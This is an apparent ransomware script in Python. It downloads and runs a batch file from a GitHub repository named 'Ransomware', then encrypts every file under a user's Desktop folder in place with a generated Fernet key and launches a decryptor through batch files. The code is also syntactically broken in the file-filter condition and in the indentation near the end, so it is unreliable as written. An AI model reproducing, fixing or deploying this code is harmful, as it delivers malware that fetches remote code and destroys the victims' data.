import subprocess
import time
import os
import requests
from cryptography.fernet import Fernet

bat_url = "https://raw.githubusercontent.com/swipax/Ransomware/main/hex.bat"
bat_filename = "hex.bat"

response = requests.get(bat_url)
if response.status_code == 200:
    with open(bat_filename, "wb") as bat_file:
        bat_file.write(response.content)

with open("run_hex.bat", "w") as run_hex_file:
    run_hex_file.write(f'@echo off\nstart {bat_filename}')
subprocess.run("run_hex.bat", shell=True)

files = []

root_path = 'C:\\Users\\Deneme\\Desktop'

for foldername, subfolders, filenames in os.walk(root_path):
    for filename in filenames:
        if filename != "desktop.ini" != "ransom.py" and filename != "generatedkey.key" and filename != "Decryptor.py" and filename!="axa.bat" and filename="hex.bat" and filename!=":run_hex.bat"
            file_path = os.path.join(foldername, filename)
            files.append(file_path)

key = Fernet.generate_key()

with open("generatedkey.key","wb") as generatedkey:
    generatedkey.write(key)

for file in files:
    with open(file, "rb") as f:
        contents = f.read()
    contents_encrypted = Fernet(key).encrypt(contents)
    with open(file, "wb") as f:
        f.write(contents_encrypted)

 deneme_py_path = r"C:\Users\Deneme\Desktop\ransom\Decrypt0r.py"
    os.system("python " + deneme_py_path)

with open("axa.bat", "w") as axa_file:
    axa_file.write("start /min python Decrypt0r.py\n")

subprocess.run("axa.bat", shell=True)